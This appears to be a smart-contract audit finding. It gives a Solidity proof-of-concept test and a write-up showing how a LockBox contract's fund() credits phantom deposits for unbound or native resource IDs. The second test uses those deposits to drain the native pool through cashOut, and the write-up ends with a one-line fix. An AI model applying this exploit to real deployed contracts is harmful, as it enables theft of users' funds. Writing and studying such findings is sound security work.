import "../src/LockBox.sol";

contract PocTest {
    LockBox public box;

    function setUp() public {
        box = new LockBox();
    }

    // Demonstrates phantom deposit via unbound resourceID
    function test_exploit() public {
        bytes32 fakeResource = keccak256("FAKE_RESOURCE");
        uint256 amount = 1000 ether;

        uint256 before = box.ledgerOf(fakeResource, address(this));
        require(before == 0, "before not zero");

        // On vulnerable code, this succeeds without any token transfer
        // because resourceToken[fake] == address(0) and isSupported[0] == true,
        // and calling address(0) returns success with empty data.
        box.fund(fakeResource, amount);

        uint256 afterBal = box.ledgerOf(fakeResource, address(this));
        require(afterBal == amount, "phantom not credited");
    }

    // Demonstrates stealing native pool via phantom NATIVE_RESOURCE deposit
    function test_stealNative() public payable {
        LockBox box2 = new LockBox();
        // Victim (this contract) locks 1 ether
        box2.lockNative{value: 1 ether}();
        require(box2.poolBalance() == 1 ether, "pool not 1");
        require(box2.ledgerOf(box2.NATIVE_RESOURCE(), address(this)) == 1 ether, "ledger not 1");

        // Attacker creates phantom deposit for native resource without paying
        bytes32 nativeRes = box2.NATIVE_RESOURCE();
        box2.fund(nativeRes, 1 ether);

        // Now ledger is 2 ether, but pool only 1 ether
        uint256 ledger = box2.ledgerOf(nativeRes, address(this));
        require(ledger == 2 ether, "ledger not 2");

        // Withdraw 1 ether phantom -> drains pool
        uint256 balBefore = address(this).balance;
        box2.cashOut(nativeRes, 1 ether);
        uint256 balAfter = address(this).balance;
        require(balAfter > balBefore, "no profit");
        require(box2.poolBalance() == 0, "pool not drained");
    }

    receive() external payable {}
}

**Vulnerability:** `fund()` resolves `token = resourceToken[resourceID]` and only checks `isSupported[token]`. For any unbound `resourceID`, `resourceToken` returns `address(0)`, and `isSupported[0]` is `true` (set for native). `_pullTokens` then does `address(0).call(transferFrom...)` which succeeds with empty return data in EVM, so the `require(done && (data.length==0 || ...))` passes. Ledger is credited without any token movement — phantom deposit. Same path allows `fund(NATIVE_RESOURCE, amount)` to inflate native ledger without paying, then `cashOut` drains `address(this).balance`.

**Fix:** In `fund()`, require `token != address(0)` before the `isSupported` check. Native deposits must go through `lockNative()` only; ERC20 deposits must have a bound non-zero token. This blocks both arbitrary-resource phantom deposits and native phantom via `fund`.

**PoC:** `test_exploit` calls `fund(fakeResource, 1000 ether)` on unbound ID and checks ledger credited. `test_stealNative` locks 1 ether via `lockNative`, then phantoms another 1 ether via `fund(NATIVE_RESOURCE,1 ether)` and drains pool via `cashOut`. On vulnerable code both pass; after patch both revert with `invalid resource`.

Patched contract adds 1 line check.

